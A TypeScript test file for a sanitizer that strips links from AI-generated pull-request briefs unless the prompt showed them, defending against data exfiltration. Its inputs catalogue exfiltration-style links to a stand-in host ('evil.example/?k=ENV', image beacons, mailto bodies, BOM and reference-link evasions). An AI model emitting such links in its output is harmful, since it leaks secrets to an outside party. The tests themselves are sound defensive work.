import type { Nodes } from "hast";
import { describe, expect, it } from "vitest";
import { LINEAR_GROWTH_CEILING, measureGrowthRatio } from "../growth-ratio";
import {
  listUnseenLinkIssues,
  removeUnseenLinks,
} from "../../src/generation/unseen-links";
import {
  parseSanitizedMarkdown,
  splitBriefSummary,
} from "../../src/sanitized-markdown";

const PROMPT = "PR: https://github.com/o/r/pull/1\nSee https://docs.example/a";
/** Far past any bounded quantifier, so a lost bound shows as quadratic growth. */
const BASE_PROMPT_CHARS = 32_000;

/** Every address the web's own pipeline would render from `markdown`. */
function listRenderedAddresses(markdown: string): string[] {
  const addresses: string[] = [];
  function visit(node: Nodes): void {
    if (node.type === "element") {
      const { href, src } = node.properties;
      const present = [href, src].filter((value) => value !== undefined);
      addresses.push(...present.map(String));
    }
    if ("children" in node) {
      node.children.forEach(visit);
    }
  }
  visit(parseSanitizedMarkdown(markdown));
  return addresses;
}

describe("removeUnseenLinks", () => {
  it("keeps the label of a Markdown link the prompt never showed", () => {
    const removal = removeUnseenLinks(
      "Read [the docs](https://evil.example/?q=TOKEN).",
      PROMPT,
    );

    expect(removal).toEqual({ text: "Read the docs.", removedCount: 1 });
  });

  it.each([
    ["a bare URL", "Leaks https://evil.example/x?k=v here", "Leaks  here"],
    ["an autolink", "Leaks <https://evil.example/x> here", "Leaks  here"],
    ["a www link", "Leaks www.evil.example/x. Done", "Leaks . Done"],
  ])("removes %s the prompt never showed", (_label, text, expected) => {
    expect(removeUnseenLinks(text, PROMPT).text).toBe(expected);
  });

  it.each([
    ["a seen URL with a tail", "x https://docs.example/a'ENV y", "x  y"],
    ["a spaced destination", "[d](<https://docs.example/a ENV>)", "d"],
    ["a parenthesised tail", "[d](https://docs.example/a()ENV)", "d"],
    ["a protocol-relative URL", "[d](//evil.example/?k=ENV)", "d"],
    ["a scheme with no slashes", "[d](http:evil.example/?k=ENV)", "d"],
    ["a reference link", "[d][r]\n\n[r]: //evil.example/?k=ENV", "d\n\n"],
    ["a mail link", "<mailto:a@evil.example?body=ENV>", ""],
    ["an image", "![x](https://evil.example/p.png?k=ENV)", ""],
    ["a link after a BOM", "\uFEFF https://evil.example/S", " "],
    ["a www link after a BOM", "\uFEFFsee www.evil.example/E", "see "],
    ["a www link after a quote", '"www.evil.example/?k=ENV"', '""'],
    ["a www link after a colon", "see:www.evil.example/?k=ENV", "see:"],
    [
      "a reference whose first definition is unseen",
      "[d][r]\n\n[r]: https://evil.example/?k=ENV\n[r]: https://docs.example/a",
      "d\n\n\n[r]: https://docs.example/a",
    ],
    [
      "a label that is itself a URL",
      "[https://evil.example/ENV](https://evil.example/ENV)",
      "",
    ],
  ])("removes %s left unseen", (_label, text, expected) => {
    expect(removeUnseenLinks(text, PROMPT).text).toBe(expected);
  });

  it("removes every unseen link from nested labels", () => {
    const nested =
      "[[[d](https://e.example/1)](https://e.example/2)](https://e.example/3)";

    expect(removeUnseenLinks(nested, PROMPT).text).not.toMatch(/e\.example/);
  });

  it("drops the whole field when a link cannot be cut out", () => {
    const encoded = '"www.evil.example/?a=1&amp;k=ENV"';

    expect(removeUnseenLinks(encoded, PROMPT).text).toBe("");
  });

  it("keeps links the prompt showed, trailing punctuation aside", () => {
    const text =
      "See [docs](https://docs.example/a) and https://github.com/o/r/pull/1.";

    expect(removeUnseenLinks(text, PROMPT)).toEqual({ text, removedCount: 0 });
  });
});

describe("removeUnseenLinks on a destination the prompt shows in part", () => {
  it.each([
    ["a relative path", "[d](/a)"],
    ["a one-letter destination", "[d](a)"],
    ["an empty destination", "[d]()"],
    ["a scheme-relative form of a seen URL", "[d](//docs.example/a)"],
    ["a seen URL cut short", "[d](https://docs.example)"],
    ["a seen URL cut inside its path", "[d](https://github.com/o/r)"],
  ])("removes %s", (_label, text) => {
    expect(removeUnseenLinks(text, PROMPT).text).toBe("d");
  });

  it.each([
    ["round brackets", "see (https://x.example/p) here"],
    ["a Markdown link", "see [t](https://x.example/p) here"],
    ["angle brackets", "see <https://x.example/p> here"],
    ["double quotes", '"url": "https://x.example/p",'],
    ["a code span", "see `https://x.example/p` here"],
    ["emphasis", "see **https://x.example/p** here"],
    ["a sentence end", "see https://x.example/p. Then"],
    ["a comma", "see https://x.example/p, then"],
    ["an assignment", "+BASE_URL=https://x.example/p"],
  ])("keeps a URL the prompt shows whole inside %s", (_label, prompt) => {
    const text = "Read [d](https://x.example/p).";

    expect(removeUnseenLinks(text, prompt)).toEqual({ text, removedCount: 0 });
  });
});

describe("removeUnseenLinks on a destination that holds more than a URL", () => {
  const prompt = "see https://x.example/p and SECRET words. Then more.";

  it.each([
    ["spaces", "[d](<https://x.example/p and SECRET words>)"],
    ["an encoded space", "[d](https://x.example/p&#32;and&#32;SECRET)"],
    ["a quote", '[d](<https://x.example/p" and>)'],
  ])("removes one with %s, whatever the prompt shows", (_label, text) => {
    expect(removeUnseenLinks(text, `${prompt} p" and`).text).toBe("d");
  });
});

describe("removeUnseenLinks on a link labelled with its own address", () => {
  it.each([
    ["the tail of a shown host", "login.microsoftonline.com"],
    ["a parent of a shown host", "see https://api.tonline.com here"],
    ["the host of a shown mailbox", "write to me@tonline.com today"],
  ])("removes one that is only %s", (_label, prompt) => {
    const removal = removeUnseenLinks(
      "[tonline.com](http://tonline.com)",
      prompt,
    );

    expect(removal).toEqual({ text: "tonline.com", removedCount: 1 });
  });

  it.each([
    ["a www address in prose", "www.docs.example/a", "see www.docs.example/a"],
    [
      "a www address behind its scheme",
      "www.docs.example/a",
      "see https://www.docs.example/a",
    ],
    ["a mailbox", "me@docs.example", "write to me@docs.example today"],
  ])("keeps %s the prompt shows whole", (_label, text, prompt) => {
    expect(removeUnseenLinks(text, prompt)).toEqual({ text, removedCount: 0 });
  });
});

describe("removeUnseenLinks on text an earlier call wrote", () => {
  it("removes a link only the previous brief's anchor shows", () => {
    const anchor =
      '<anchor_brief index="1">\nsummary: `https://evil.example/?k=ENV`\n</anchor_brief>';
    const prompt = `${PROMPT}\n\n## Anchor\n${anchor}\n\n## Diff\n+x`;

    const removal = removeUnseenLinks(
      "[d](https://evil.example/?k=ENV)",
      prompt,
    );

    expect(removal).toEqual({ text: "d", removedCount: 1 });
  });

  it("keeps a link the description shows beside the anchor", () => {
    const anchor =
      '<anchor_brief index="1">\nsummary: plain words\n</anchor_brief>';
    const prompt = `${anchor}\n<pr_description>\n${PROMPT}\n</pr_description>`;
    const text = "[d](https://docs.example/a)";

    expect(removeUnseenLinks(text, prompt)).toEqual({ text, removedCount: 0 });
  });
});

describe("removeUnseenLinks on reference definitions", () => {
  it("removes a definition no link uses when its URL is unseen", () => {
    const removal = removeUnseenLinks(
      "Text.\n\n[r]: https://evil.example/?k=ENV",
      PROMPT,
    );

    expect(removal).toEqual({ text: "Text.\n\n", removedCount: 1 });
  });

  it("leaves no unseen address in either half of a split summary", () => {
    const summary = [
      "[r]: https://docs.example/a",
      "Lede.",
      "## Changelog",
      "[r]: https://evil.example/?k=ENV",
      "- [d][r]",
    ].join("\n\n");

    const { text } = removeUnseenLinks(summary, PROMPT);

    const { lede, changelog = "" } = splitBriefSummary(text);
    const rendered = [lede, changelog].flatMap(listRenderedAddresses);
    expect(rendered.join(" ")).not.toMatch(/evil/);
    expect(text).toContain("## Changelog");
  });
});

describe("removeUnseenLinks cost", () => {
  it.each([
    [
      "a label of one mark over a run of that mark",
      "[!](http://!)",
      (chars: number) => `${"!".repeat(chars)}x`,
    ],
    [
      "a label that repeats through the prompt",
      "[a.b](http://a.b)",
      (chars: number) => "a.b,".repeat(chars / 4),
    ],
    [
      "a URL the prompt repeats before long punctuation",
      "[d](https://x.example/p)",
      (chars: number) =>
        `https://x.example/p${"!".repeat(64)}`.repeat(chars / 83),
    ],
  ])("checks %s in linear time", (_label, text, makePrompt) => {
    const ratio = measureGrowthRatio((scale) => {
      const prompt = makePrompt(BASE_PROMPT_CHARS * scale);
      return () => removeUnseenLinks(text, prompt);
    });

    expect(ratio).toBeLessThan(LINEAR_GROWTH_CEILING);
  });
});

describe("removeUnseenLinks cost on an address that overlaps itself", () => {
  it("checks a label that repeats against its own period in linear time", () => {
    const label = `${"www.".repeat(500)}www`;
    const text = `[${label}](http://${label})`;

    const ratio = measureGrowthRatio((scale) => {
      const prompt = "www.".repeat((BASE_PROMPT_CHARS * scale) / 4);
      return () => removeUnseenLinks(text, prompt);
    });

    expect(ratio).toBeLessThan(LINEAR_GROWTH_CEILING);
  });

  it("never looks for a destination longer than any real address", () => {
    const destination = `https://x.example/${"a".repeat(2100)}`;
    const text = `[d](${destination})`;

    expect(removeUnseenLinks(text, `see ${destination} here`).text).toBe("d");
  });
});

describe("removeUnseenLinks with a leading BOM", () => {
  it("checks the link the renderer shows, not a shifted span", () => {
    const planted = "desc https://evil.example/ here";
    const text = "\uFEFF https://evil.example/S https://evil.example/E";

    expect(removeUnseenLinks(text, planted).text).not.toMatch(/evil/);
  });
});

describe("listUnseenLinkIssues", () => {
  it("names the field and the count, never the URL", () => {
    const removal = removeUnseenLinks(
      "x https://evil.example/?q=TOKEN",
      PROMPT,
    );

    const issues = listUnseenLinkIssues("summary", removal);

    expect(issues).toEqual([
      "summary: removed 1 link(s) the input never showed",
    ]);
  });

  it("reports nothing when no link went", () => {
    expect(
      listUnseenLinkIssues("summary", { text: "", removedCount: 0 }),
    ).toEqual([]);
  });
});
